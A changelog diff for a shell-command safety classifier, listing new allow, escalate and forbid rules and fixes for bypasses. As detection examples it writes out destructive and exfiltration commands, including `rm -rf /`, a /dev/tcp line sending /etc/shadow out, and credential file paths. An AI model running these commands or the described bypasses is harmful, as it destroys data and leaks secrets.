@@ -7,6 +7,76 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ## [Unreleased]
 
+### Added
+
+- **classifier**: New `dev-tool-run` allow rule for scripting runtimes (python, node, ruby, perl, php, java, etc.)
+- **classifier**: New `build-tool` allow rule for build systems (make, cmake, cargo, mvn, gradle, gcc, clang, etc.)
+- **classifier**: New `go-tool` allow rule for Go ecosystem tools (go, gofmt, gopls, golangci-lint, etc.)
+- **classifier**: New `file-management` allow rule for basic file operations (mkdir, cp, mv, ln, touch, install)
+- **classifier**: New `text-processing` allow rule for text manipulation tools (awk, sed, jq, cut, tr, diff, etc.) — excludes `sed -i` which is caught by `in-place-edit`
+- **classifier**: New `network-diagnostic` allow rule for network troubleshooting commands (ping, dig, nslookup, traceroute, netstat, ss, lsof, etc.)
+- **classifier**: New `archive-tool` allow rule for archive/compression utilities (tar, zip, unzip, gzip, bzip2, xz, zstd, etc.)
+- **classifier**: New `shell-builtin` allow rule for common shell builtins and utilities (export, set, printf, tput, alias, type, ulimit, etc.)
+- **classifier**: New `open-command` allow rule for opening URLs/files in default applications (open, xdg-open, start)
+- **classifier**: New `package-install` escalated rule for local package installation (pip install, npm/yarn/pnpm install, cargo install, go install, gem install, conda install)
+- **classifier**: New `background-process` escalated rule for background execution (nohup, trailing &, disown, screen, tmux)
+- **classifier**: New `in-place-edit` escalated rule for in-place file modification (sed -i, perl -i)
+- **classifier**: New `shell-wrapper-unwrap` forbidden rule that detects shell wrapper commands (`sh -c`, `bash -c`, `cmd /c`, `powershell -Command`, etc.) and recursively classifies the inner command — prevents bypassing forbidden rules via `bash -c "rm -rf /"` or `cmd /c "rmdir /s /q ."`
+- **classifier**: New `windows-recursive-delete` forbidden rule that blocks `rmdir /s` and `rd /s` targeting dangerous paths (`.`, `..`, drive roots, system directories)
+- **classifier**: New `windows-del-recursive` forbidden rule that blocks `del /s` and `erase /s` with wildcard targets (`*`, `*.*`) or dangerous paths
+- **classifier**: New `windows-format` forbidden rule that blocks the Windows `format` command targeting any drive letter
+- **classifier**: New `powershell-destructive` forbidden rule that blocks `Remove-Item -Recurse` targeting dangerous paths
+- **classifier**: New `container-escape` escalated rule for namespace/chroot manipulation commands (`nsenter`, `chroot`, `unshare`) — prevents container escape primitives from running without approval; `--help`/`--version` flags bypass as safe
+
+### Changed
+
+- **classifier**: `docker-build` rule now matches `podman build/push/pull` in addition to `docker` — consistent with `docker-container` and `docker-compose` rules that already handle podman
+- **classifier**: Deduplicated `Match`/`MatchArgs` logic across rules using shared helpers and `matchFields` closures — `serviceManagementRule`, `downloadToFileRule`, `gitStashDropRule`, `dockerBuildRule`, `recursiveDeleteRootRule`, `destructiveFindRule`, `recursivePermRootRule`
+- **classifier**: Allow rules now use typed `RuleName` constants and local result variables to reduce duplication
+- **classifier**: Extracted shared `pipeShells` list to eliminate duplication between `pipeToShellRule` and `containsPipeToShell`
+- **classifier**: Added `ScanEntriesProgress` to `examples/internal/dataset` for configurable progress output
+
+### Fixed
+
+- **classifier**: `isSimpleCommand` now performs a paranoid final scan with all quotes treated as literals — even-count stray quotes (e.g. two apostrophes in paths) can no longer pair up and hide compound operators like `&&` and `|`; `ls /tmp/it's here && rm -rf /tmp/that's bad` is correctly rejected as non-simple
+- **classifier**: `dev-tool-run` allow rule now rejects `npx` commands with `-y`/`--yes` flags — `npx -y playwright-cli` (auto-install without confirmation) falls through to sandboxed; `npx prettier --write .` (no auto-install) remains allowed
+- **classifier**: `build-tool` allow rule now uses a whitelist for `dotnet` subcommands — only `build`, `run`, `test`, `clean`, `restore`, `publish`, `format`, `watch` are allowed; `dotnet new`, `dotnet add`, `dotnet nuget`, `dotnet --install-sdk` fall through to sandboxed
+- **classifier**: `git-read-commands` allow rule now restricts `git branch` to read-only (listing) operations — `git branch`, `git branch -a`, `git branch --list`, `git branch --show-current` are allowed; `git branch <name>` (create), `git branch -d` (delete), `git branch -m` (rename) fall through to sandboxed
+- **classifier**: `archive-tool` allow rule now restricts all archive/compression commands to read-only operations — `zip` requires `-l` flag, `7z`/`7za` require `l`/`t` subcommand, `gzip`/`bzip2`/`xz`/`zstd` require `-l`/`-t` flag; `zip -r out.zip`, `7z x archive.7z`, `gzip file.txt` fall through to sandboxed
+- **classifier**: `build-tool` allow rule now restricts `mvn` to safe goals — only `compile`, `test`, `verify`, `package`, `validate`, `clean`, and `dependency:`/`help:`/`versions:` prefixes are allowed; `mvn install`, `mvn deploy`, `mvn archetype:generate` fall through to sandboxed
+- **classifier**: `build-tool` allow rule now rejects `make` with dangerous targets — `clean`, `distclean`, `install`, `uninstall` are rejected; bare `make` and `make all` remain allowed
+- **classifier**: `archive-tool` allow rule now includes `zipinfo` command (always read-only)
+- **classifier**: `archive-tool` allow rule now only permits read-only archive operations — `tar -xzf` (extraction) and `tar -czf` (creation) fall through to sandboxed; `unzip` requires an explicit read-only flag (`-l`, `-p`, `-t`) to be allowed; other compression tools (gzip, xz, zstd) remain allowed
+- **classifier**: `windows-safe-commands` allow rule now rejects piped commands containing dangerous PowerShell cmdlets (`Stop-Process`, `Remove-Item`, `Stop-Service`, `Restart-Service`, `Clear-Content`, `Set-ExecutionPolicy`) — `Get-Process | Stop-Process -Force` is no longer classified as Allow
+- **classifier**: `git-read-commands` allow rule now restricts `git tag` to read-only operations (`git tag`, `git tag -l`, `git tag -v`/`--verify`) — `git tag -a` (create), `git tag -d` (delete), `git tag -s` (sign), and lightweight `git tag tagname` fall through to sandboxed
+- **classifier**: `build-tool` allow rule now rejects install subcommands for `dotnet` and `cargo` — `dotnet tool install`, `dotnet new install`, `dotnet workload install`, and `cargo install` fall through to escalated/sandboxed rules
+- **classifier**: `isSimpleCommand` now detects bare `&` (single ampersand) as a command separator — Windows `cmd.exe` uses `&` to chain commands, so `ping 127.0.0.1 > nul & shutdown /s /t 0` is no longer classified as a simple (safe) command; redirect operators `>&` and `&>` are correctly skipped
+- **classifier**: `go-tool` allow rule now rejects state-modifying subcommands: `go install`, `go get` fall through to escalated rules; `go env -w` (writes Go environment config) falls to sandboxed — safe subcommands like `go build`, `go test`, `go vet`, `go mod tidy` remain allowed
+- **classifier**: `dev-tool-run` allow rule now rejects install patterns: `py -m pip install`, `python3 -m pip install`, `npx X install`, `uvx X install` fall through to sandboxed — normal usage like `python3 script.py`, `npx create-react-app` remains allowed
+- **classifier**: `shell-builtin` allow rule now rejects output redirection (`>`, `>>`) and pipes to clipboard tools (`pbcopy`, `xclip`, `xsel`, `clip`) — `printf 'data' > file` and `echo secret | pbcopy` fall through to sandboxed
+- **classifier**: `open-command` allow rule now restricts Windows `start` command to URL targets only (http/https/ftp/mailto/ms-settings) — `start photoshop` and `start py script.py` fall through to sandboxed; macOS `open` and Linux `xdg-open` remain unrestricted
+- **classifier**: `credential-access` rule now excludes SSH public key files (`*.pub`) — `cat ~/.ssh/id_ed25519.pub` is correctly allowed while `cat ~/.ssh/id_ed25519` (private key) remains escalated
+- **classifier**: `kernel-module` rule now allows read-only `modprobe` flags: `--show-depends`, `--show-modversions`, `--dump-modversions`, `--dry-run`, `-n` — these informational queries fall through to sandboxed instead of forbidden
+- **classifier**: `credential-access` rule now detects additional sensitive file paths: cloud provider credentials (`~/.alibabacloud/`, `~/.config/gcloud/`, `~/.kube/config`), container registry credentials (`~/.docker/config.json`), CLI tokens (`~/.config/gh/hosts`), system password files (`/etc/shadow`), and shell/REPL history files (`.bash_history`, `.zsh_history`, `.mysql_history`, etc.)
+- **classifier**: `recursive-perm-root` rule no longer false-positives on filenames containing `-R` as a substring (e.g., `chmod 644 file-README`) — now uses per-argument flag checking instead of `strings.Contains` on the full command string
+- **classifier**: `windowsSafeCommandsRule.MatchArgs` now correctly uses `baseCommand(name)` instead of raw `name` for PowerShell cmdlet and `$env:` checks — consistent with the `Match` handler
+- **classifier**: `hasOutputRedirectOrClipboardPipe` now applies `baseCommand()` to pipe target — path-qualified clipboard tools like `/usr/bin/pbcopy` are correctly detected
+- **classifier**: `open-command` rule — `startArgsAreSafe` no longer has a generic `://` fallback; only explicitly listed safe protocols (http, https, ftp, mailto, ms-settings, etc.) are allowed — blocks `start file:///C:/Windows/System32/cmd.exe` and `start evil://payload`
+- **classifier**: Protected path matching now normalizes paths with `path.Clean` — `rm foo/../.git/hooks/pre-commit` is correctly detected as a write to `.git/hooks/` instead of bypassing via path traversal
+- **classifier**: `splitCompoundSegments` is now quote-aware — `&&`, `||`, `;` inside quoted strings are no longer treated as command separators
+- **classifier**: `git-read-commands` allow rule now rejects `git remote` with write subcommands (add, remove, rename, set-url, etc.) even when `-v` flag is present — `git remote add origin -v` falls through to sandboxed
+- **classifier**: `reverse-shell` rule — `isTimeoutConnectivityProbe` now rejects non-standard fd redirects (`>&3`, `<&5`, etc.) via `hasNonStdFDRedirect` — blocks data exfiltration like `timeout 3 bash -c 'exec 3<>/dev/tcp/host/4444; cat /etc/shadow >&3'`
+- **classifier**: `reverse-shell` rule — `rsArgsDevTCP` (ClassifyArgs path) now calls `isTimeoutConnectivityProbe` for consistency with the Classify path — timeout-wrapped connectivity probes are correctly exempted via both API entry points
+- **classifier**: `kernel-module` rule — `isModprobeReadOnly` now rejects compound commands containing command separators (`&&`, `||`, `;`) — prevents `modprobe --show-depends nvidia && modprobe nvidia` from being exempted as read-only
+- **classifier**: `filesystem-format` and `kernel-module` rules — `-V` flag is no longer globally exempt; it now only exempts the command when it is the sole argument (`hasVersionOnlyFlag`) — `mkfs.ext4 -V /dev/sda1` is correctly Forbidden while `mkfs.ext4 -V` (version check only) remains allowed
+- **classifier**: `isSimpleCommand` now rejects pipes (`|` and `|&`) — piped commands like `cat foo | head` and `tasklist | findstr claw` no longer match allow rules; quoted pipes in strings remain safe; dangerous pipe targets are still caught by `pipeToShellRule`
+- **classifier**: `package-install` rule now detects `python -m pip install`/`uninstall` — all Python launcher variants (`python`, `python3`, `python3.X`, `py`) invoking pip via `-m` flag are correctly escalated; also added `uninstall` as a pip/pip3 subcommand
+- **classifier**: `network-diagnostic` allow rule now rejects `route` write subcommands (`add`, `delete`, `del`, `change`, `flush`) — `route add 10.0.0.0 ...` falls through to sandboxed while `route`, `route print`, `route -n` remain allowed
+- **classifier**: `system-package-install` rule now includes `winget install` and `winget upgrade` — Windows package manager operations are correctly escalated
+- **classifier**: `isSimpleCommand` now rejects I/O redirections (`>`, `>>`, `<`, `<<`) — commands like `echo hello > file.txt` no longer pass as simple allow-rule matches; safe fd-to-fd merges (`2>&1`, `>&2`) are still permitted
+- **classifier**: `baseCommand` now strips Windows executable suffixes (`.exe`, `.cmd`, `.bat`) and handles backslash paths — `python.exe`, `pip.exe`, `curl.exe`, `C:\Python39\python.exe` are normalized to their base names so all classifier rules match uniformly
+- **classifier**: `system-package-install` rule now includes `choco` (install, upgrade, uninstall), `scoop` (install, update, uninstall), and `winget uninstall` — Windows package manager operations are correctly escalated
+
 ### Changed
 
 - **classifier**: `docker-build` rule now matches `podman build/push/pull` in addition to `docker` — consistent with `docker-container` and `docker-compose` rules that already handle podman
